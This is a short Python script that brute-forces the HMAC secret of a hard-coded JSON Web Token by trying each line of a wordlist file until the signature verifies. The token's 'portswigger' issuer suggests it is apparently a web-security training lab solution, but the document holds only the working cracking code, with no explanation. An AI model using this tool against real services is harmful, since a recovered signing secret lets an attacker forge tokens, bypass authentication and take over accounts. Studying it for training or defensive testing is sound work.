import jwt

jwt_token = "eyJraWQiOiI5OGYxYzk1Ni1lNDliLTRhMWEtYmU2My1iNmUwOTdjMmM2NDAiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0Nzg0Nzk2MCwic3ViIjoid2llbmVyIn0.9M1g1UNhloUtd63Kar_-_i-YTA0w4T72wGHNf1jdB48"

with open("jwt.secrets.list") as f:
    secrets = [line.strip() for line in f]

header, payload, signature = jwt_token.split('.')

for secret in secrets:
    try:
        decoded = jwt.decode(jwt_token, secret, algorithms=["HS256"])
        print(f"Found secret: {secret}")
        break
    except Exception:
        pass
